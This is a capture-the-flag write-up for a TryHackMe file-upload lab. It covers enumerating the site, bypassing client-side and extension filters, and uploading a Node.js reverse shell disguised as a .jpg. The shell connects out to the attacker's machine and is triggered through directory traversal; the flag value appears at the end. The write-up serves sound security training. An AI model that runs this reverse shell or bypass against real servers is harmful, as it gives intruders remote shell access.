# Task 11 Challenge - Write-up
A very cool and 1337-like CTF file-upload web vulnerability. Take note that the attack machine for TryHackMe was used to complete this challenge.

## The task
It's challenge time!

Head over to jewel.uploadvulns.thm.

Take what you've learned in this room and use it to get a shell on this machine. As per usual, your flag is in /var/www/. Bear in mind that this challenge will be an accumulation of everything you've learnt so far, so there may be multiple filters to bypass. The attached wordlist might help. Also remember that not all webservers have a PHP backend...

## The Solution
### Enumeration
Visiting the website `jewel.uploadvulns.thm`, one can easily infer that the website accepts `jpg/jpeg` images, functionally for jewels, to showcase through the website. Somehow, we need to exploit this file upload vulnerability.

In CTFs like this one, it is imperative to gather as much information as possible on the target. As we were first introduced in the room to enumerate via `gobuster`, we will do exactly that.
```console
root@ip-10-10-241-182:~# gobuster dir -u jewel.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://jewel.uploadvulns.thm
[+] Threads:        64
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/02/09 20:58:12 Starting gobuster
===============================================================
/content (Status: 301)
/modules (Status: 301)
/admin (Status: 200)
/assets (Status: 301)
/Content (Status: 301)
/Assets (Status: 301)
/Modules (Status: 301)
/Admin (Status: 200)
Progress: 9029 / 220561 (4.09%)
```
Looking at the admin page, we see that we are able to execute code through it by choosing files in the `/modules` directory. From this, one can recognize that this is a potential directory-traversal vulnerability. 

Looking at the page source is another method of enumeration. The following lines are interesting. 
```html
    		<script src="assets/js/jquery-3.5.1.min.js"></script>
		<script src="assets/js/jquery.colour-2.2.0.min.js"></script>
		<script src="assets/js/upload.js"></script>
		<script src="assets/js/backgrounds.js"></script>
	</head>
	<body>
		<div id="one" class="background"></div>
		<div id="two" class="background" style="display:none;"></div>
```
`<script src="assets/js/upload.js"></script>` indicate some sort of script for filtering file-uploads. By clicking on this script, we are met with the following lines of code.
```js
$(document).ready(function(){let errorTimeout;const fadeSpeed=1000;function setResponseMsg(responseTxt,colour){$("#responseMsg").text(responseTxt);if(!$("#responseMsg").is(":visible")){$("#responseMsg").css({"color":colour}).fadeIn(fadeSpeed)}else{$("#responseMsg").animate({color:colour},fadeSpeed)}clearTimeout(errorTimeout);errorTimeout=setTimeout(()=>{$("#responseMsg").fadeOut(fadeSpeed)},5000)}$("#uploadBtn").click(function(){$("#fileSelect").click()});$("#fileSelect").change(function(){const fileBox=document.getElementById("fileSelect").files[0];const reader=new FileReader();reader.readAsDataURL(fileBox);reader.onload=function(event){
			//Check File Size
			if (event.target.result.length > 50 * 8 * 1024){
				setResponseMsg("File too big", "red");			
				return;
			}
			//Check Magic Number
			if (atob(event.target.result.split(",")[1]).slice(0,3) != "Ã¿ÃÃ¿"){
				setResponseMsg("Invalid file format", "red");
				return;	
			}
			//Check File Extension
			const extension = fileBox.name.split(".")[1].toLowerCase();
			if (extension != "jpg" && extension != "jpeg"){
				setResponseMsg("Invalid file format", "red");
				return;
			}
const text={success:"File successfully uploaded",failure:"No file selected",invalid:"Invalid file type"};$.ajax("/",{data:JSON.stringify({name:fileBox.name,type:fileBox.type,file:event.target.result}),contentType:"application/json",type:"POST",success:function(data){let colour="";switch(data){case "success":colour="green";break;case "failure":case "invalid":colour="red";break}setResponseMsg(text[data],colour)}})}})});
```
In addition, one can find a reference to the background image of the website of the form `/content/XXX.jpg`. It is reasonable to think that the images are uploaded are stored there.

Great! It seems like the JavaScript code filters by means of (1) File Extension, (2) Magic Number, and (3) File size. Since I am able to access this filtering, the script is a client-side filter which can be removed through `Burp Suite` via interception of responses. We do exactly this.

![Burp Suite Interception](/Images/Task11_uploadvulns_0)

Interesting, the header `X-Powered-By: Express` suggests that the server uses `Node.js` for its back-end programming language. This allows us to search online for a reverse shell code for `Node.js`. The reverse shell code used is from [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs)
```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4444, "10.10.241.182", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```
Notice that I replaced the port field and IP-field appropriate to the machine who is going to be listening. In my case, it was the AttackBox machine.

Now that the client-side filter is removed, we can try to upload our Node.js reverse shell. One can quickly see that the file is not accepted suggesting that there are server-side filters in place. Editing our reverse shell to have the name `reverse-shell.jpg` and uploading it however leads to an acceptance. Awesome!

Remember the admin page? Well, we can leverage the directory-traversal vulnerability to get it to execute `reverse-shell.jpg`. We set-up a listener so:
```console
root@ip-10-10-241-182:~# nc -lvnp 4444
```
By typing in the field of the admin page with `../content/ALX.jpg`, we get a connection!!! A reverse-shell was created! Finally, `cat /var/www/flag.txt` on our attacking machine who received the reverse shell gives us the flag `THM{NzRlYTUwNTIzODMwMWZhMzBiY2JlZWU2}`.




